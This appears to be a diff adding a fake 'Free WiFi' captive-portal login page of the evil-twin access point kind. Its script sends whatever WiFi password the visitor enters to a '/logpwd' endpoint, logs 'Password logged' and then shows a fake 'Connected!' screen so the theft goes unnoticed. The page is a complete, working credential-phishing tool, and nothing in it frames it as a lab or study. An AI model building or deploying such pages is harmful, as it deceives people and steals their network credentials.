@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="pragma" content="no-cache">
+    <meta http-equiv="expires" content="-1">
+    <title>Free WiFi - Authentication Required</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+            width: 90%;
+            max-width: 400px;
+        }
+        .header {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        .header h1 { font-size: 24px; margin-bottom: 5px; }
+        .header p { font-size: 14px; opacity: 0.8; }
+        .wifi-icon { font-size: 48px; margin-bottom: 10px; }
+        .form-container { padding: 30px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
+        .form-group input {
+            width: 100%; padding: 12px 15px;
+            border: 2px solid #e0e0e0; border-radius: 10px;
+            font-size: 16px; transition: border-color 0.3s;
+        }
+        .form-group input:focus { outline: none; border-color: #667eea; }
+        .submit-btn {
+            width: 100%; padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white; border: none; border-radius: 10px;
+            font-size: 18px; font-weight: 600; cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .submit-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4); }
+        .info-text { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
+        .loading { display: none; text-align: center; padding: 20px; }
+        .spinner {
+            border: 3px solid #f3f3f3; border-top: 3px solid #667eea;
+            border-radius: 50%; width: 40px; height: 40px;
+            animation: spin 1s linear infinite; margin: 0 auto 15px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success-message { display: none; text-align: center; padding: 40px 30px; }
+        .success-icon { font-size: 60px; color: #4CAF50; margin-bottom: 20px; }
+        .success-message h2 { color: #333; margin-bottom: 10px; }
+        .success-message p { color: #666; }
+        .error-message { display: none; background: #ffebee; color: #c62828; padding: 12px; border-radius: 8px; margin-bottom: 15px; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="wifi-icon">&#127911;</div>
+            <h1>Free WiFi</h1>
+            <p>Please sign in to access the internet</p>
+        </div>
+        <div class="form-container" id="loginForm">
+            <div class="error-message" id="errorMsg"></div>
+            <form id="authForm" onsubmit="return handleSubmit(event)">
+                <div class="form-group">
+                    <label for="password">WiFi Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter your WiFi password" required>
+                </div>
+                <button type="submit" class="submit-btn">Connect</button>
+            </form>
+            <p class="info-text">This network may require a password provided by the network administrator.</p>
+        </div>
+        <div class="loading" id="loadingScreen">
+            <div class="spinner"></div>
+            <p>Connecting to network...</p>
+        </div>
+        <div class="success-message" id="successScreen">
+            <div class="success-icon">&#10004;</div>
+            <h2>Connected!</h2>
+            <p>You now have access to the internet.</p>
+        </div>
+    </div>
+    <script>
+        function handleSubmit(e) {
+            e.preventDefault();
+            var password = document.getElementById('password').value;
+            var errorMsg = document.getElementById('errorMsg');
+            if (password.length < 8) {
+                errorMsg.textContent = 'Password must be at least 8 characters';
+                errorMsg.style.display = 'block';
+                return false;
+            }
+            fetch('/logpwd', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'pwd=' + encodeURIComponent(password)
+            })
+            .then(function(response) { return response.text(); })
+            .then(function(data) { console.log('Password logged'); })
+            .catch(function(err) { console.log('Logging error: ' + err); });
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loadingScreen').style.display = 'block';
+            setTimeout(function() {
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('successScreen').style.display = 'block';
+            }, 2000);
+            return false;
+        }
+    </script>
+</body>
+</html>
